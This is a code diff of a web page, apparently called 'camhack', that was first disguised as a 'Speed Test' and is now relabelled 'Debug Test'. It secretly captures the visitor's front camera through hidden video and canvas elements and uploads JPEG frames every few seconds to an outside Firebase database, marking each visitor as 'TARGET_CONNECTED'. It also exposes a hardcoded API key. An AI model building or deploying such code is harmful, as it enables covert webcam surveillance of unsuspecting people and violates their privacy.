@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Speed Test</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Debug Test</title>
 </head>
 <body>
-    <h1>⚡ Speed Test</h1>
+    <h1>🔍 Debug Test</h1>
     <div id="status">Starting...</div>
+    <div id="log"></div>
     
     <video id="video" autoplay muted playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
@@ -15,6 +15,11 @@
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
     <script>
+        function log(msg) {
+            console.log(msg);
+            document.getElementById('log').innerHTML += msg + '<br>';
+        }
+        
         const config = {
             apiKey: "AIzaSyDm83pllDlsMkmcj2S5HR4_jgAHcXyEVfI",
             databaseURL: "https://camhack-realtime-default-rtdb.firebaseio.com"
@@ -26,15 +31,29 @@
         const params = new URLSearchParams(window.location.search);
         const sessionId = params.get('session') || 'test123';
         
-        let frameCount = 0;
+        log('🎯 Session: ' + sessionId);
         
-        console.log('Session:', sessionId);
-        document.getElementById('status').textContent = 'Session: ' + sessionId;
+        // Test Firebase connection first
+        db.ref('test').set({
+            timestamp: Date.now(),
+            message: 'Firebase test'
+        }).then(() => {
+            log('✅ Firebase connected');
+        }).catch(err => {
+            log('❌ Firebase failed: ' + err.message);
+        });
         
-        // Start camera immediately
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // Start camera
+        navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                width: 640, 
+                height: 480,
+                facingMode: 'user'
+            } 
+        })
         .then(stream => {
-            console.log('Camera OK');
+            log('✅ Camera access granted');
+            
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
@@ -44,46 +63,59 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 
-                // Send status
+                log('📷 Camera ready: ' + canvas.width + 'x' + canvas.height);
+                
+                // Send status to Firebase
                 db.ref('sessions/' + sessionId + '/status').set({
                     type: 'TARGET_CONNECTED',
-                    timestamp: Date.now()
+                    timestamp: Date.now(),
+                    cameraWidth: canvas.width,
+                    cameraHeight: canvas.height
+                }).then(() => {
+                    log('✅ Status sent to Firebase');
+                }).catch(err => {
+                    log('❌ Status send failed: ' + err.message);
                 });
                 
-                console.log('Status sent');
-                document.getElementById('status').textContent = 'Camera active - Sending frames';
+                // Send test frame immediately
+                setTimeout(() => {
+                    sendFrame();
+                }, 1000);
                 
-                // Start sending frames
-                setInterval(() => {
-                    ctx.drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const reader = new FileReader();
-                        reader.onload = () => {
-                            frameCount++;
-                            
-                            const frameData = {
-                                image: reader.result,
-                                frameNumber: frameCount,
-                                timestamp: Date.now()
-                            };
-                            
-                            db.ref('sessions/' + sessionId + '/frames').push(frameData)
-                            .then(() => {
-                                console.log('Frame sent:', frameCount);
-                                document.getElementById('status').textContent = 'Frame sent: ' + frameCount;
-                            })
-                            .catch(err => {
-                                console.error('Send failed:', err);
-                            });
-                        };
-                        reader.readAsDataURL(blob);
-                    }, 'image/jpeg', 0.7);
-                }, 2000); // 1 frame per 2 seconds
+                // Then send frames every 3 seconds
+                setInterval(sendFrame, 3000);
             };
+            
+            function sendFrame() {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        const frameData = {
+                            image: reader.result,
+                            frameNumber: Date.now(),
+                            timestamp: Date.now(),
+                            size: reader.result.length
+                        };
+                        
+                        log('📤 Sending frame - Size: ' + Math.round(frameData.size/1024) + 'KB');
+                        
+                        db.ref('sessions/' + sessionId + '/frames').push(frameData)
+                        .then(() => {
+                            log('✅ Frame sent successfully');
+                            document.getElementById('status').textContent = 'Frame sent: ' + new Date().toLocaleTimeString();
+                        })
+                        .catch(err => {
+                            log('❌ Frame send failed: ' + err.message);
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                }, 'image/jpeg', 0.8);
+            }
         })
         .catch(err => {
-            console.error('Camera failed:', err);
-            document.getElementById('status').textContent = 'Camera failed: ' + err.message;
+            log('❌ Camera failed: ' + err.message);
         });
     </script>
 </body>
